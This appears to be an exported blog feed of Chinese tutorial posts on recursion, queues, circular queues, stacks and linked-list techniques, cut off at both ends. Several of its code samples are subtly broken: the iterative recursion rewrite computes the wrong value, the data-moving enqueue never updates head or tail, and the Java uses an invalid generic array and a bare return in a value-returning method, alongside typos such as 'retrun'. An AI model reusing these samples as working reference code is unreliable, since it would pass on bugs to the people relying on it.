表示递归的深度int depth = 0;int f(int n)&#123; ++depth; if(depth&gt;1000)throw exception; if(n==1) return 1; return f(n-1)+1;&#125; 但这种做法并不能完全解决问题，因为最大允许的递归深度跟当前线程剩余的栈空间大小有关，事先无法计算。如果实时计算，代码过于复杂，就会影响了代码的可读性。所以，如果最大深度比较小，比如10、50，就可以用这种方法，否则这种方法并不是很实用。 递归代码警惕重复计算 除此之外，使用递归时还会出现重复计算的问题，将刚才讲的第二个递归代码的例子，如果我们把整个递归过程分解一下的话，那就是这样的： 从图中，我们可以直观的看到，想要计算f(5)，需要先计算f(4)、f(3)，而计算f(4)还需要计算f(3)，因此f(3)就被计算了很多次，这就是重复计算问题。 为了避免重复计算问题，我们可以用一个数据结构（比如散列表）来保存已经求解过的f(n)。当递归调用到f(n)时，先看下是否已经求解过了。如果是则直接从散列表中取值返回，不需要重复计算，这样就能避免刚才讲的重复计算了。 按照上面的思路，我们再来改造一下代码：1234567891011Map&lt;String, Integer&gt; map = new Hashmap&lt;&gt;();public static int f(int n)&#123; if(n==1) return 1; if(n==2) return 2; if(map.containsKey(n))&#123; return map.get(n); &#125; int ret = f(n-1) + f(n-2); map.put(n, ret); return ret;&#125; 除了堆栈溢出、重复计算这两个常见的问题，递归代码还有其他很多别的问题。 在时间效率上，递归代码里多了很多函数调用，当这些函数调用的数量较大时，就会积累成一个可观的时间成本。在空间复杂度上，因为递归调用一次就会在内存栈上保存一次现场数据，所以进行递归代码的空间复杂度分析时，需要考虑这部分的开销。比如电影院的的例子中，空间复杂度并不是O(1)，而是O(n)。 怎样将递归代码改写为非递归代码 我们刚讲了，递归有利有弊，利是递归代码的表达力很强，写起来非常简洁；而弊是空间复杂度高，有堆栈溢出的风险，存在重复计算的问题，过多的函数调用会导致耗时较多等问题。所以在实际开发中，我们需要根据实际情况来选择是否需要用递归的方式来实现。 那我们是否可以将递归代码改写为非递归代码呢？ 仍以刚才的电影院的例子，我们抛开场景，只看f(n) = f(n-1)+1 这个递推公式。我们可以这样改改看看：1234567int f(int n)&#123; int ret = 1; for(int i=2; i&lt;=n; ++i)&#123; ret = ret+i; &#125; return ret;&#125; 同样，第二个例子也可以改写为非递归的方式实现。 1234567891011121314int f(int n)&#123; if(n==1)return 1; if(n==2)return 2; int ret = 0; int prepre = 1; // f(1)=1 int pre = 2; // f(2)=2 for(int i=3;i&lt;=n;++i)&#123; //f(3) = f(2)+f(1) ret = pre + prepre; prepre = pre; pre = ret; &#125; return ret;&#125; 那是不是所有的递归代码都可以改写为这种迭代循环的非递归写法呢？ 笼统的讲，是的。因为递归本身就是借助栈来实现的，只不过我们使用的栈是系统或者虚拟机本身提供的，我们没有感知罢了。如果我们自己在内存堆上实现栈，手动模拟入栈、出栈过程，这样任何递归代码都可以改写成看上去不是递归代码的样子。 但是这种思路实现上是将递归改为了“手动”递归，本质并没有变，而且也没有解决前面讲到的基础问题，徒增了实现的复杂度。 解答开篇 到此为止，递归相关的知识也讲完了，我们来看一下开篇的问题：如何找到“最终推荐人”？我们的解决方案是这样的： 12345long findRootRefererId(long actorId)&#123; long refererId = select referer_id from [table] where actor_id = actorId; if(refererId == null) return actorId; return findRootRefererId(refererId)&#125; 是不是非常简洁，用三行代码就搞定了，不过在实际项目中，上面的代码并不能工作，为什么呢？这里有两个问题。 第一，如果递归很深，可能会有堆栈溢出问题。 第二，如果数据库存在脏数据，我们还需要处理由此产生的无限循环递归的问题。比如demo环境下数据库中，测试工程师为了方便测试，会认为的插入一些数据，就会出现脏数据，如果A的推荐人是B，B的推荐人是C，C的推荐人是A，这样就会发生死循环。 内容小结 递归是一种非常高效、简洁的编码技巧，只要满足“三个条件”的问题都可以通过递归代码来解决。 不过递归代码也比较难写、难理解。编写递归代码的关键就是不要把自己绕进去，正确姿势是写出递推公式，找到终止条件，然后再翻译成递归代码。 递归代码虽然简洁高效，但是递归代码也有很多弊端。比如，堆栈溢出、重复计算、函数调用耗时多、空间复杂度高等，所以，在编写递归代码时，一定要控制好这些副作用。 思考题1、 递归代码的时间复杂度该如何分析？ 2、 递归代码如何调试呢？你有什么好的调试方法吗？ (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>递归</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-队列]]></title>
    <url>%2Fposts%2F2018-09-16-%E7%AE%97%E6%B3%95-%E9%98%9F%E5%88%97.html</url>
    <content type="text"><![CDATA[前言 我们知道，CPU资源是有限的，任务的处理逻辑与线程个数并不是正相关。相反，过多的线程反而会导致CPU频繁切换，处理性能下降。所以，线程池的大小一般都是综合考虑要处理任务的特点与硬件环境，来事先设置的。 当我们向一个固定大小的线程池中请求一个线程时，如果线程池中没有空闲资源了，这个时候线程池如何处理这个请求？是拒绝请求还是排队请求？各种处理策略又是如何实现的？ 其实，这些问题并不复杂，其底层的数据结构就是今天的内容，队列(queue)。 如何理解队列 队列这个概念非常好理解，你可以把它想象成排队买票，先来的先买，后来的人只能站末尾，不允许插队。先进者先出，这就是典型的队列。 我们知道，栈只支持两个操作：入栈push()和出栈pop()，队列和栈非常类似，支持的操作只有：入队enqueue()，将一个数据放入队尾，出队dequeue()，从队头取出一个数据。 所以，队列跟栈一样，也是一种操作受限的线性表数据结构。 队列的概念很好理解，基本操作也很容易掌握。作为一种非常基础的数据结构，队列的应用也非常广泛。特别是一些具有额外特性的队列，比如循环队列、阻塞队列、并发队列。它们在很多片底层系统、框架、中间件的开发中，起着关键性的作用。比如高性能队列Disruptor、Linux环形存储，都用到了循环队列；java.concurent并发包中用到了ArrayBlockingQueue来实现公平锁等。 顺序队列和链式队列 我们知道了，队列跟栈一样，也是一种抽象的数据结构。它具有先进先出的特性，支持在队尾插入元素，在对头删除元素，那么究竟该如何实现一个队列呢？ 跟栈一样，队列可以用数组实现，也可以用链表实现。用数组实现的栈叫做顺序栈，用链表实现的栈叫做链式栈。同样，用数组实现的队列叫做顺序队列，用链表实现的队列叫做链式队列。 先来看下基于数组的实现方法。我这里采用java语言进行实现，不会涉及高级语法。 12345678910111213141516171819202122232425262728293031323334353637// 基于数组实现的队列public class ArrayQueue&lt;T&gt;&#123; // 数组items private T[] items; // 队列大小 private int size=0; private int capacity; // head表示队头下标，tail表示队尾下标 private int head=0; private int tail=0; public ArrayQueue()&#123; this(10); // 队列默认容量给10 &#125; public ArrayQueue(int capacity)&#123; this.items = new T[capacity]; this.capacity = capacity; &#125; public boolean enqueue(T val)&#123; if(size == capacity)&#123;return false;&#125; // 队列满了 items[tail] = val; size ++; tail ++; return true; &#125; public T dequeue()&#123; if (size == 0) &#123; return; &#125; T res = items[head]; head++; size--; return res; &#125;&#125; 比起栈的数组实现，队列的数组实现稍微有点复杂。 对于栈来说，我们只需要一个栈顶指针就可以了，但是队列需要两个指针：一个head指针，指向队头；一个tail指针，指向队尾。 你可以结合下面这幅图来理解。当a、b、c、d…依次入队之后，指针中的head指针指向下标为1的位置，tail指针指向下标为7的位置。 当我们调用两次出队操作之后，队列中的head指针指向下标为5的位置，tail仍然指向下标为7的位置。 你肯定已经发现了，随着不停的入队、出队操作，head、tail都会持续往后移动。当tail移动到最右边，即使数组中还有空闲空间，也无法继续往队列中添加数据了。这个问题如何解决呢？ 在数组那一节中，我们遇到过同样的问题，数组的删除操作会导致数组中的数据不连续，还记得我们怎么解决得吗？数据搬移！，但是每次出队时都相当于删除数组下标为0的数据，要搬移整个队列中的数据，这样队列的出队时间复杂度就从原来的O(1)变为了O(n)，能不能优化呢？ 实际上，我们在出队时可以不用搬移数据，如果没有空闲空间了，我们只需要在入队时，在集中触发一次数据的搬移操作。借助这个思想，出队函数保持不变，我们稍加改造一下入队函数enqueue()实现，就可以轻松解决刚才的问题了。 12345678910111213141516public boolean enqueue(T val)&#123; if(size == capacity)&#123;return false;&#125; // 队列满了 // tail到尾部，队列没有满 if (tail == capactity &amp;&amp; size&lt;capacity) &#123; // 数据搬移 for (int i=head;i&lt;tail;i++) &#123; // 将head到tail的数据搬移到0到size的位置 items[i-head] = items[i] &#125; &#125; items[tail] = val; size ++ ; tail ++; return true;&#125; 从代码中我们可以看到，当队列tail指针移动到数组的最右边后，且数组没有满时，如果有新的数据入队，我们可以将head-tail之间的数据，整体搬移到0-size之间的位置， 这种思路中，出队的时间复杂度仍然是O(1)，但是入队的时间复杂度还是O(n)吗？此处用以前讲过的摊还分析法自行分析一下。 接下来，我们看看基于链表的队列的实现方法。 基于链表的实现，我们同样需要两个指针：head指针和tail指针。他们分别指向第一个结点和最后一个结点。入队时，tail-&gt;next = newNode, tail = tail-&gt;next;出队时，head = head-&gt;next。 我将具体代码放到我的github上，有需要的可以看看。 循环队列 我们上面用数组实现的队列，在tail=capacity的时候，会有数据搬移操作，这样入队操作性能就会受到影响。那有没有办法能够避免数据搬移操作呢？我们来看看循环队列的解决思路。 循环队列，顾名思义，它长得像一个环。原本数组是有头有尾的，是一条直线，我们现在把首尾相连，掰成了一个环，可以通过下图直观感受一下。 我们可以看到，图中这个队列的大小为8，当前head=0，tail=3.当有一个新的元素d入队时，我们放入到下标为3的位置，并将tail指向4。当tail指向7，这时候再有新的元素入队时，我们并不将tail更新为8，而是将tail指向0，如果再有元素入队，放入下标为0处的位置，并将tail更新为1。当然如果head=0处没有出队的话，就说明队列满了。 通过这样的方法，我们成功的避免了数据搬移操作，看起来不难理解，但是循环队列的代码实现难度要比前面讲的非循环队列难多了。要想写出没有bug的循环队列的实现代码，最关键的是，确定队列空和队列满的判定条件。 在用数组实现的队列中，对空的判定条件是head==tail，队列满的条件是tail==capacity。那针对循环队列，如何判断队满和队空呢？ 队列为空的条件仍然是head==tail，但是队列满了的判断条件就复杂了，我画了如下一张队列满的图，可以看一下队满的规律。 图中队列满时，tail=3，head=4，size=8，capacity=8，多画几张队满的图，就会发现队满时（tail+1）%capacity = head。同时，head和tail不能简单的使用++或者–，得出规律tail=(tail+1)%capacity，head=(head+1)%capacity。 下面看下一下循环队列的代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// 基于数组实现的循环队列public class CircularQueue&lt;T&gt; implements Queue&lt;T&gt; &#123; // 数组items private Object[] items; // 队列大小 private int size=0; private int capacity; // head表示队头下标，tail表示队尾下标 private int head=0; private int tail=0; public CircularQueue()&#123; this(10); // 队列默认容量给10 &#125; public CircularQueue(int capacity)&#123; this.items = new Object[capacity]; this.capacity = capacity; &#125; public boolean enqueue(T val)&#123; if ((tail+1)%capacity == head)&#123; throw new RuntimeException("循环队列满了！"); &#125; items[tail] = val; tail = (tail+1)%capacity; size ++; return true; &#125; public T dequeue()&#123; if (size&lt;=0)&#123; throw new RuntimeException("空队列！"); &#125; T res = (T) items[head]; size--; head = (head+1)%capacity; return res; &#125; @Override public String toString() &#123; return Arrays.toString(items); &#125; @Override public int size() &#123; return size; &#125;&#125; 阻塞队列和并发队列 上面讲的都是些理论知识，看起来很难跟实际项目扯上关系，确实，队列这种数据结构很基础，平时的业务开发不大可能从零开始实现一个队列，甚至都不会直接用到。而一些具有特殊特性的队列应用却比较广泛，如阻塞队列和并发队列。 阻塞队列其实就是在队列基础上增加了阻塞操作。简单来说，就是在队列为空的时候，从对头取数据会被阻塞。并未此时还没有数据可取，直到队列中有了数据才能返回；如果队列已经满了，那么插入数据的操作就会被阻塞，直到队列中有空闲位置后在插入数据，然后在返回。 你应该已经发现了，上述的定义就是一个”生产者-消费者模型”！是的，我们可以用阻塞队列轻松实现一个”生产者-消费者模型”。 这种基于阻塞队列实现的”生产者-消费者模型”可以有效的协调生产和消费的速度。当”生产者”生产数据的速度过快，”消费者”来不及消费时，存储数据的队列很快就会满了，这个时候，生产者就阻塞等待，直到”消费者”消费了数据，”生产者”才会被唤醒继续生产。 而且不仅如此，基于阻塞队列，我们可以通过协调”生产者”和”消费者”的个数，来提高数据处理的效率。比如前面的例子，我们可以配备多个”消费者”，来对应一个”生产者”。 前面讲了阻塞队列，在多线程情况下，会有多个线程同时操作队列，这个时候就会存在线程安全问题，那如何实现一个线程安全的队列呢？ 线程安全的队列我们叫做并发队列。最简单直接的实现方式是直接在enqueue()、dequeue()上加锁，但是这样锁粒度大并发较低，同一时刻仅允许一个村或者取操作。实际上，基于数组的循环队列，利用CAS原子操作，可以实现非常高效的并发队列。这也是循环队列比链式队列应用更加广泛的原因。 解答开篇 队列的知识讲完了，我们来看一下开篇的问题。线程池没有空闲线程时，新的任务请求线程资源时，线程池该如何处理，各种处理策略又是如何实现的呢？ 我们一般有两种处理策略。第一种是非阻塞的处理方式，直接拒绝任务请求；另一种是阻塞的处理方式，将请求进行排队，等到有空闲线程时，取出队列中的请求继续处理。那如何存储排队的请求呢？ 我们希望公平的处理每个排队的请求，先进者先出，所以队列这种数据结构很适合存储排队请求。我们前面说过，队列有基于链表和基于数组这两种方式，那这两种实现方式对于排队请求又有什么区别呢？ 基于链表实现的方式，可以实现一个支持无限排队的无界队列，但是可能会导致过多的请求排队等待，请求处理的响应时间过长。所以，针对响应时间较敏感的系统，基于链表实现的无限排队的线程池是不合适的。 而基于数组实现的有界队列，队列的大小有限，所以线程池中排队的请求超过队列大小时，接下来的请求就会被拒绝，这种方式对响应时间敏感的系统，就相对来说比较合理。不过设置一个合适的队列大小，也是非常有讲究的。队列太大导致等待的请求太多，队列太小会导致无法充分利用系统资源，发挥最大性能。 除了前面讲到的应用在线程池请求排队的场景之外，队列还可以应用在任何有限资源池中，用于排队请求，比如数据库连接池。实际上，对于大部分资源有限的场景，当没有空闲资源时，基本上都可以通过队列这种数据结构来实现队列请求排队。 内容小结 今天我们讲了一种跟栈很相似的数据结构，队列。 队列最大的特点就是先进先出，主要的两个操作是入队和出队。跟栈一样，它既可以用数组来实现，也可以用链表来实现。用数组实现的叫顺序队列，用链表实现的叫链式队列。特别是一个长得像环一样的叫循环队列。在用数组实现的队列时，会有数据搬移的工作，要想解决数据搬移的工作，我们就需要像环一样的循环队列。 循环队列是这篇的重点，要想写出没有bug的循环队列的实现代码，关键是要确定队满和队空的判定条件。 除此之外，还有几种高级的数据结构，阻塞队列、并发队列，但是底层都是队列这种数据结构，只不过附加了其他的一些功能。阻塞队列就是可以对出队、入队操作进行阻塞，并发队列就是保证了多线程的队列操作线程安全。 课后思考 1、 除了线程池这种池结构会用到队列排队请求，你还知道那些类似的数据结构或者场景会用到队列的排队请求。 如数据库的连接池、分布式应用中的消息队列（kafka、MQ） 2、 关于并发队列，如何实现无锁的并发队列。 提示： CAS(compare and swap) 乐观锁 悲观锁 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>队列</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-栈]]></title>
    <url>%2Fposts%2F2018-09-15-%E7%AE%97%E6%B3%95-%E6%A0%88.html</url>
    <content type="text"><![CDATA[前言 浏览器的前进、后退功能，我想你肯定很熟悉吧？ 当你依次访问完一连串页面a-b-c-d之后，点击浏览器的后退按钮，就可以查看之前浏览过的页面c-b-a。当后退到a页面之后，点击前进按钮，可以重新进入页面b-c-d。但是如果进入页面b之后，点击了两一个页面，那就无法通过前进后退页面进入c-d了。 假如你是浏览器的开发设计者，你会如何实现这个功能呢？带着这个问题，我们来看一下“栈”这个数据结构。 (adsbygoogle = window.adsbygoogle || []).push({}); 如何理解栈？ 关于栈，举一个非常贴切的例子。比如叠盘子，我们放盘子的时候都是从下往上一个一个放。取的时候，我们也是从上往下一个一个取，不能从中间抽取。先进者后出，后进者先出，这就是典型的栈结构。 从栈的操作特性上来看，栈是一种操作受限的线性表，只允许在一端插入和删除数据。 我第一次接触这种数据结构的时候，就对它存在的意义产生了很大的疑惑。因为相比数组和链表，栈带给我的只有限制，并没有任何优势。那我直接使用数组或者链表就好了？为什么还要用这个“操作受限”的数据结构呢？ 事实上，从功能上来说，数组和链表确实可以代替栈，但是你要知道，特定的数据结构是对特定场景的抽象，而且数组和链表暴露了太多的操作接口，操作上的确灵活自由，但使用时就比较不可控，自然就更容易出错。 当某个数据集合只涉及在一端插入和删除数据时，并且满足先进后出、后进先出的特性，我们就应该用栈这种数据结构。 如何实现一个栈？ 从刚才栈的定义里可以看出，栈主要包含两个操作，入栈和出栈。也就是在在栈顶插入一个数据和从栈顶删除一个数据。理解了栈的定义之后，我们来看一看如何用代码实现一个栈。 实际上，栈可以用数组来实现，也可以用链表来实现。用数组实现的栈，我们叫做顺序栈，用链表实现的栈，我们叫做链式栈。 基于数组实现的顺序栈我这里用Java实现一个基于数组的顺序栈，基于链表的实现，可以自己写一下。 12345678910111213141516171819202122232425262728293031323334353637383940// 基于数组实现的链式栈public class ArrayStack&lt;T&gt; implements stack&lt;T&gt; &#123; private final Object [] DEFAULT_ARRAY = new Object[10]; private final int DEFAULT_CAP = 10; private Object[] data; private int cap; private int size; public ArrayStack() &#123; this.cap = DEFAULT_CAP; this.size = 0; this.data = DEFAULT_ARRAY; &#125; public ArrayStack(int cap)&#123; if (cap &lt; 0) throw new IllegalArgumentException("Illegal Capacity: "+ cap); this.cap = cap; this.data = new Object[cap]; &#125; public void push(T val) &#123; if (size&lt;cap)&#123; // 数组满了 data[size] = val; size++; &#125;else &#123; throw new Runtime("stack is full!") // 可以动态扩容的stack // Object[] objects = new Object[cap*2]; // System.arraycopy(data, 0, objects, 0, size); // data = objects; // data[size] = val; // size ++; &#125; &#125; public T pop() &#123; if (size == 0) return null; T result = (T) data[size-1]; size--; return result; &#125;&#125; 了解了定义和基本操作，那它的操作时间、空间复杂度是多少呢？ 不管是链式栈还是顺序栈，我们存储数据需要一个大小为n的数组就够了。在入栈和出栈的过程中，只需要一两个临时变量存储空间，因此时间复杂度是O(1)。 注意这里存储数据需要一个大小为n的数组，并不是说空间复杂度是O(n)，因为这n个空间是必须的，无法省掉。所以我们说空间复杂度的时候，是指除了原本的数据存储空间外，算法运行还需要额外的存储空间。 时间复杂度分析：不管是入栈、出栈，都只涉及栈顶个别数据的操作，因此时间复杂度为O(1)。 支持动态扩容的顺序栈刚才那个基于数组实现的顺序栈，是一个固定大小的栈，也就是说，在初始化后需要实现指定栈的大小，当栈满之后，就无法在王栈里添加数据了，尽管链式栈的大小不受限，但是要存储next指针，内存消耗相对较多。那我们如何实现一个可以支持动态扩容的栈呢？ 还记得，在数组那一节，要如何来实现一个支持动态扩容的数组吗？当数组空间不足时，我们重新申请一块更大的内存，将原来数组中的数据拷贝过去，这样就实现了一个支持动态扩容的数组。 所以，如果实现一个支持动态扩容的栈，我们只需要底层依赖一个支持动态扩容的数组就可以了。当栈满了之后，我们就申请一个更大的数组，将原来的数据搬移到新的数组中。 实际上，支持动态扩容的顺序栈，我们开发中并不经常用到。这块我们复习一下复杂度分析方法。现在我们来分析一下支持动态扩容的顺序栈的入栈、出栈时间复杂度。 对于出栈操作来说，不会涉及到内存的重新申请和数据搬移，所以出栈的时间复杂度仍然是O(1)。但是对于入栈操作来说，情况就不一样了，当栈中有空闲空间时，入栈操作时间复杂度为O(1)，当栈中没有空间不够时，就需要重新申请内存和数据搬移，所以时间复杂度就变成了O(n)。 也就是说，对于入栈操作来说，最好时间复杂度为O(1)，最坏情况时间复杂度为O(n)。那平均情况下的时间复杂度是多少呢？还记得时间复杂度分析方法中的摊还分析法吗？这个入栈操作的平均情况的时间按复杂度正好可以用摊还分析法来分析。 为了分析方便，我们先做一些假设和定义： 栈空间不够时，我们重新申请一个是原来大小两倍的数组； 为了简化分析，假设只有入栈操作没有出栈操作； 定义不涉及内存搬移操作的入栈操作为simple-push操作，时间复杂度为O(1)。 如果当前栈大小为K，并且已满，当在有新的的数据要入栈时，就需要重新申请2倍大小的内存，并且做K个数据的搬移操作，然后在入栈。但是，接下来的K-1次入栈操作，我们都不需要在重新申请内存和搬移数据，所以这k-1次都只需要一次simple-push操作就可以完成。如下图： 从上图看出，这K次入栈操作，总共涉及了K个数据的搬移，以及K次simple-push操作。讲K个数据搬移均摊到K次入栈操作，那每个入栈操作只需要一个数据搬移和一个simpel-push操作。以此类推，入栈操作的时间复杂度为O(1)。 通过这个例子分析，也验证了前面讲的，均摊时间复杂度一般都等于最好时间复杂度。因为在大部分情况下，入栈操作的时间复杂度都是O(1)，只有在个别情况才会退化为O(n)，所以把耗时多的入栈操作的时间均摊到其他入栈操作上，平均情况下耗时就接近O(1)。 栈的应用场景 栈在函数调用中的应用前面讲的都比较偏理论，我们现在来看，栈在软件工程中的实际应用。栈作为一个比较基础的数据结构，应用场景还是蛮多的。其中比较经典的一个应用场景就是函数调用栈。 我们知道，操作系统给每个线程分配了一块独立的内存空间，这块内存空间被组织成“栈”这种结构，用来存储函数调用时的临时变量。每进入一个函数，就会将临时变量作为一个栈帧入栈，当被调用函数执行完成，返回之后，将这个函数对应的栈帧出栈。为了更好理解函数调用栈，一起来看一下这段代码的执行过程。 123456789101112131415int main()&#123; int a = 1; int ret = 0; int res = 0; ret = add(3,5); res = a + ret; printf("%d", res); return 0;&#125;int add(int x, int y)&#123; int sum = 0; sum = x + y; return sum;&#125; 从代码中我们可以看出，main函数调用了add函数，获取计算结果，并且与临时变量a相加，最后打印res的值，为了清晰的看到这个过程的函数栈里对应的入栈、出栈过程，我这里画了一张函数栈图： 栈在表达式求值中的应用我们再来看一个栈的常见应用场景，编译器如何利用栈实现表达式求值。 这里我们用一个只包含加减乘除四则运算的表达式来解释，比如：34+13*9+44-12/3。对于这个四则运算，我们人脑可以很快算出来，但是对于计算机来说，理解这个表达式本身就是个挺难的事。如果是你，你会怎么实现一个表达式求值的功能呢？ 实际上，编译器就是通过两个栈来实现的。其中一个是保存操作数的栈，另一个保存运算符的栈。我们从左往右遍历表达式，当遇到数字，我们直接压入操作数栈。当遇到运算符，就与运算符的栈顶元素进行比较。如果运算符比当前栈顶元素的优先级高，就直接压入运算符栈中，如果比栈顶元素的优先级低或者相同，就将当前栈顶元素取出，再从操作数栈中取出两个操作数，然后进行运算，再把计算完的结果压入操作数栈，继续比较。 这里用一个简单的例子：3+5*8-6 我将这个表达式的计算过程画成一个图，结合图来理解刚才的计算过程。 栈在括号匹配中的应用出了用栈来实现表达式求值，我们还可以借助栈来检查表达式中的括号是否匹配。 我们同样简化一下背景，假设表达式只包含三种括号，圆括号()、方括号[]、花括号{}，并且他们可以任意嵌套。比如{[{}]}、[([]){()}]等都为合法格式，而{[}()或[{(}]为非法格式。那现在给你一个包含三种括号的表达式字符串，如何检查它是否合法呢？ 这里也可以用栈来解决。我们用栈来保存未匹配的左括号，从做到右一次扫描字符串。当扫描到左括号时，则将其压入栈中，当扫描到右括号时，从栈顶取出一个左括号。如果能够匹配，比如”(“和”)”匹配、”[“和”]”匹配、”{“和”}”匹配，则继续扫描剩下的字符串。如果扫描过程中，遇到不能匹配的右括号，或者栈中没有数据，则说明为非法格式。 当所有的括号都扫描完成后，如果栈为空，则说明字符串为合法格式；否则说明有为匹配的左括号，为非法格式。 解答开篇 好了，理解了栈的概念和应用，再回头看看开篇的问题。如何实现浏览器的前进、后退功能？学过栈之后，就可以用两个栈完美的解决这个问题了。 我们使用两个栈X、Y，把首次浏览的页面压入栈X，当点击后退按钮时，依次从栈X中出栈，并将出栈的数据依次放入栈Y。当我们点击前进按钮时，依次取出栈Y中的数据，并放入栈X。当X中没有数据时，说明没有页面可以后退了。当Y中没有数据时，说明没有页面可以点击前进按钮进行浏览了。 当我们依次浏览了a、b、c三个页面，我们依次把a、b、c压入栈，这个时候，两个栈的数据就是如下这个样子： 当我们通过浏览器的后退按钮，从页面c后退到页面a之后，我们依次把c、b从栈X中弹出，并且依次放入栈Y中，这个时候栈中的数据就是如下： 这时候，又想看页面b，于是点击前进按钮回到b页面，我们就把b再从栈Y中取出，放入X，此时栈中数据如下： 总结 栈是一种操作受限的数据结构，只支持入栈和出栈操作。后进先出是它的最大特点。栈既可以通过数组来实现，也可以通过链表来实现。不管是数组实现的栈，还是链表实现的栈，他们的入栈、出栈时间复杂度都为O(1)。在基于数组实现的动态扩容的顺序栈中，时间复杂度均为O(1)，重点是入栈时间复杂度中关于摊还分析法的掌握。 思考 1、再讲栈的应用时，讲到用函数调用栈来保存临时变量，为什么函数调用要用”栈”这种数据结构来保存临时变量呢？用其他数据结构可以吗？2、我们知道，JVM内存管理中有个“堆栈”的概念。栈内存用来白村局部变量和方法调用，堆内存用来存储java中的对象。那JVM里面的“栈”和我们这里的“栈”一样吗？不一样的话，为什么叫“栈”呢？]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-怎样写好链表代码]]></title>
    <url>%2Fposts%2F2018-09-13-%E7%AE%97%E6%B3%95-%E6%80%8E%E6%A0%B7%E5%86%99%E5%A5%BD%E9%93%BE%E8%A1%A8%E4%BB%A3%E7%A0%81.html</url>
    <content type="text"><![CDATA[上一节讲了链表相关的基础知识，有人可能会说基础知识我都掌握了，但是写链表代码还是很费劲怎么办？确实是这样的，想要写好链表代码并不是容易的事，尤其是那些复杂的链表操作，比如链表反转、有序链表合并等，写的时候非常容易出错。 为什么链表代码这么难写？究竟怎么样才能比较轻松的写出正确的链表代码呢？ 只要愿意投入时间，我觉得大多数人都是可以学会的。比如，如果你真能花一整天或者一个周末，就去写链表反转这一个代码，多写几次，知道能毫不费力的写出bug free的代码，这个坎儿还会很难跨吗？ 当然，自己有决心并且付出精力是成功的先决条件，除此之外，我们还需要掌握一些技巧和方法。下面我总结了几个写链表的代码技巧，如果能熟练掌握这几个技巧，叫上主动和坚持，轻松拿下链表代码完全没有问题。 理解指针或引用的含义事实上，看懂链表的结构并不是很难，但是一旦把它和指针混在一起，就很容易让人摸不着头脑。所以要想写好链表代码，首先就要理解好指针。 有些语言有“指针”的概念，比如C语言，有些语言没有指针，取而代之的是“引用”，比如Java、Python等。不管是指针还是引用，实际上，它们的意思都是一样的，都是存储所指对象的内存地址。 接下来，我会拿C语言中的指针来讲解。如果你用的是Java或者其他语言也没关系，把它理解成引用就可以了。 实际上，对于指针的理解，只需要记住下面这句话就可以了：将某个变量赋值给指针，实际上就是将这个变量的地址赋值给指针，或者反过来说，指针中存储了这个变量的内存地址，指向了这个变量，通过指针就能找到这个变量。 在编写链表代码的时候，经常会有这样的代码：p-&gt;next = q，这行代码是说p结点中的next指针存储了q结点的内存地址。还有一个更复杂的，也是写链表代码经常用到的：p-&gt;next = p-&gt;next-&gt;next，意思是说p结点的next指针存储了p结点的下下一个结点的内存地址。 掌握了指针或者引用的概念，应该可以很轻松的看懂链表代码。 警惕指针丢失和内存泄露不知道你有没有这样的感觉，写链表代码的时候指针指来指去，一会就不知道指针到哪里了。所以我们在写代码的时候，一定不要弄丢了指针。 如上图所示，当我们在a结点和b结点之间插入结点c，假设当前指针p指向结点a。如果我们将代码写成下面这个样子，就会发生指针丢失和内存泄露。 12p-&gt;next = c; // 将p的next指针指向c结点c-&gt;next = p-&gt;next; //将c结点next指针指向b结点 当p-&gt;next指针在完成第一步操作之后，已经不再指向b结点了，而是指向结点c，因此，第二行代码相当于将c-&gt;next指针指向了自己。因此整个链表断裂成了两半，从结点b之后的所有结点都无法访问了。 对于有些语言来说，比如C语言，内存管理是由程序员负责的，如果没有手动释放结点对应的内存空间，就会产生内存泄露，所以，我们在插入结点时，一定要注意操作的顺序。要先将c结点的next指针指向b，再将a结点的next指针指向c，这样才不会丢失指针，导致内存泄露。 利用哨兵简化实现难度首先，我们回顾一下单链表的插入、删除操作。如果我们在结点p之后插入一个结点，只需要下面两行代码就可以了。 12new_node-&gt;next = p-&gt;next; p-&gt;next = new_node; 但是当我们向一个空链表中插入第一个结点，刚刚的逻辑就不能用了。我们需要进行下面这样的特殊处理，其中head表示链表的头结点。所以从这段代码可以看出，对于单链表的插入操作，第一个结点和其他结点的插入逻辑是不同的。 1234if (head == null)&#123; head = new_node;&#125; 同样再来看一下链表的删除操作，如果要删除p结点的后继点点，我们只需要一行代码就可以搞定： 1p-&gt;next = p-&gt;next-&gt;next； 但是如果要删除链表的最后一个结点，这样的代码就不行了。跟插入类似，我们也需要对这种情况特殊处理。代码如下： 1234if (head-&gt;next == null)&#123; head = null;&#125; 可以看出，针对链表的插入、删除操作，需要对第一个结点的插入和最后一个结点的删除情况进行特殊处理。这样代码实现起来就会很繁琐，不简洁，而且也容易因为考虑不全而出错。那如何来解决这个问题呢？ 这时上面提到的哨兵就出场了。现实中的哨兵，解决的是国家之间的边界问题。同理我们这里的哨兵也是解决“边界问题的”，不直接参与业务逻辑。 还记得如何表示一个空链表呢？head=null表示链表中没有结点了，其中head表示头结点指针，指向链表中的第一个结点。 如果我们引入哨兵结点，在任何时候，不管链表是不是为空，head指针都会一直指向这个哨兵结点。我们把这种有哨兵的链表叫做带头链表，相反，没有哨兵结点的链表叫做不带头链表。 如下我画了一个带头链表，可以发现，哨兵结点是不存储数据的。因为哨兵结点一直存在，所以插入第一个结点和插入其他结点，删除最后一个结点和删除其他结点，都可以统一为相同的代码实现逻辑。 实际上，这种利用哨兵简化编程难度的技巧，在很多代码实现中都有用到，比如插入排序、归并排序、动态规划等。这里用C语言实现一个简单的例子，不涉及语法方面的高级知识，你可以类比其他语言。 代码一： 123456789101112131415161718// 在数组a中，查找key，返回key所在的位置，其中n代表数组，a代表长度int find(char* a, int n, char key)&#123; // 边界条件处理，如果a为空，或者n&lt;=0 if(a == null || n&lt;=0)&#123; return -1; &#125; int i=0; // 这里有两个比较操作： i&lt;n 和 a[i] == key while(i&lt;n)&#123; if(a[i] == key)&#123; retrun i; &#125; ++i; &#125; retrun -1;&#125; 代码二： 12345678910111213141516171819202122232425262728293031323334// 